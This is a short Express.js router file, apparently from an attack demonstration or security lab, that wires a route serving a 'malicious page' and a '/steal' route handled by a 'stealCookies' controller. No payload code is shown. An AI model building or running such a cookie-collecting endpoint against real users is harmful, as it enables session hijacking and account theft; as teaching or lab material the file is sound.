const express = require("express");
const router = express.Router();
const attackController = require("../controllers/attackController");

router.get("/", attackController.getMaliciousPage);
router.get("/steal", attackController.stealCookies);

module.exports = router;
